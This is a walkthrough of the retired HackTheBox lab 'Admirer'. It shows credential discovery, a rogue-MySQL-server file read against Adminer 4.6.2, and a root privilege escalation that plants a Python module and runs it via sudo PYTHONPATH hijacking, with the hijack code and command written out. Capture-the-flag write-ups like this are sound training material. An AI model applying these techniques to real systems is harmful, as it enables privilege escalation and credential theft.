This is a writeup about a retired HacktheBox machine:
[Admirer](https://www.hackthebox.com/home/machines/profile/248) created by
[polarbearer](https://www.hackthebox.com/home/users/profile/159204) and
[GibParadox](https://www.hackthebox.com/home/users/profile/125033) and publish on
May 2, 2020.
This box is classified as an easy machine. The user part implied a few
enumeration and an adminer vulnerability.
The root part implied a sudo permission with SETENV and a python script.

<!-- PELICAN_END_SUMMARY -->

# User

## Recon

We start with an nmap scan. Only the ports 21(FTP), 22 (SSH) and 80 (HTTP) are open.

## FTP

The ftp service doesn't allow anonymous connections.

## Web

The home web page is a collection of picture.

![Home page](/media/2020.09/admirer_01.png)

We look at the `robot.txt` file, it contains the location of some `admin-dir`
directory supposed to contain some credentials.

    :::text
    User-agent: *

    # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
    Disallow: /admin-dir

We try a few filename like `passwords.txt`, `creds.txt`â€¦ `credentials.txt` works
and give use a few usernames and password for some services including ftp.

    :::text
    [Internal mail account]

    [FTP account]
    ftpuser
    %n?4Wz}R$tTF7

    [Wordpress account]
    admin
    w0rdpr3ss01!

## Back to the FTP

We connect to the FTP account using the creds. This allow us to get a SQL dump
(nothing interesting in it) and an archive of the web site. This archive give
show the existence of an interesting directory `utility-scripts`. It also give
use credentials for a MySQL database in the `db_connect.php` file.
The comment at the end of the file `// TODO: Finish implementing this or find a better open source alternative`
is also an hint for the next part.

## Back to the web

We use `dirb` on the `utility-scripts` directory. As we know that the
application is using php we add the `.php` extension. The tool discover the page
`adminer.php`.

## Adminer

[Adminer](https://www.adminer.org/) is a tools to manage your database directly
from your browser. It is a [phpmyadmin](https://www.phpmyadmin.net/)
alternative.

Obviously we land on a login page. The previously found credentials doesn't work.
But looking at the page, we see that the used version is "4.6.2" and that the
last version is "4.7.6".

![adminer page](/media/2020.09/admirer_02.png)

We Google for "adminer 4.6.2 exploit" and found an article about a
[serious vulnerability in adminer tool](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

We just need a [Rogue MySql Server](https://github.com/allyshka/Rogue-MySql-Server).
We launch it and start getting some files. We try `db_connect.php` but the file
was obviously replace by `adminer.php`. We can retrieve `adminier.php` just to
be sure that our exploit is working. Then we just retrieve `../index.php` which
contain the new creds for the database.

                                            <?php
                            $servername = "localhost";
                            $username = "waldo";
                            $password = "&<h5b~yK3F#{PaPB&dA}{H>";
                            $dbname = "admirerdb";


We can then connect to the local database with adminer but there is nothing
interesting there.

I have the habit to create two files `user` and `passwd` containing the looted
data. We use `hydra` to test the gather creds against the ssh service. The last
password found is a valid SSH password for the `waldo` user.

    :::text

We can then connect to ssh and get the user flag.

    :::text

# Way to root

With our ssh connection with start to enumerate the box. The first thing we
notice is that we have the sudo permission to execute
`/opt/scripts/admin_tasks.sh` with the `SETENV` flag. Which means that our
environmental variable will be preserved.

    :::text
    waldo@admirer:~$ sudo -l
    [sudo] password for waldo:
    Matching Defaults entries for waldo on admirer:
        env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

    User waldo may run the following commands on admirer:
        (ALL) SETENV: /opt/scripts/admin_tasks.sh

When looking at the script we see a few interesting blocks.

The first interesting part is the `backup_shadow` function. I tried some race
condition between the moment the file is backuped and not yet `chown` to root.
But that is not working.

    :::bash
    backup_shadow()
    {
        if [ "$EUID" -eq 0 ]
        then
            echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
            /bin/cp /etc/shadow /var/backups/shadow.bak
            /bin/chown root:shadow /var/backups/shadow.bak
            /bin/chmod 600 /var/backups/shadow.bak
            echo "Done."
        else
            echo "Insufficient privileges to perform the selected operation."
        fi
    }

The next one is the `backup_web` function as this call an external python
script.

    :::bash
    backup_web()
    {
        if [ "$EUID" -eq 0 ]
        then
            echo "Running backup script in the background, it might take a while..."
            /opt/scripts/backup.py &
        else
            echo "Insufficient privileges to perform the selected operation."
        fi
    }

The python script import the `make_archive` function from `shutil`. And then
create a `tar.gz` archive from `/var/www/hml`.

    :::python
    #!/usr/bin/python3

    from shutil import make_archive

    src = '/var/www/html/'

    # old ftp directory, not used anymore
    #dst = '/srv/ftp/html'

    dst = '/var/backups/html'

    make_archive(dst, 'gztar', src)

As we can export our environmental variable to `sudo`, we can rewrote the
`shutil` module to execute the code we want. We wrote a specific `shutil.py` script:

        :::text
        def make_archive(a,b,c):
            print('ok')
            with open('/root/root.txt') as f:
                with open('/tmp/plop/flag.txt', 'w') as g:
                    g.write(f.read())

And run the web backup with specifying our `PYTHONPATH` environment variable.

    :::text
    waldo@admirer:/tmp/plop$ sudo PYTHONPATH=/tmp/plop /opt/scripts/admin_tasks.sh 6
    Running backup script in the background, it might take a while...
    waldo@admirer:/tmp/plop$ ok
    cat flag.txt

# Wrapping up

The box was a combination of simple techniques. As the exposed surface was
really small (FTP, SSH and HTTP) there was not a lot of rabbit hole during
exploration. I am a bit mad that the "exploit" for adminer was not in
`searchsploit` as I lost some time before putting the search into Google.

The root part was quit simple if you know already know the issue.
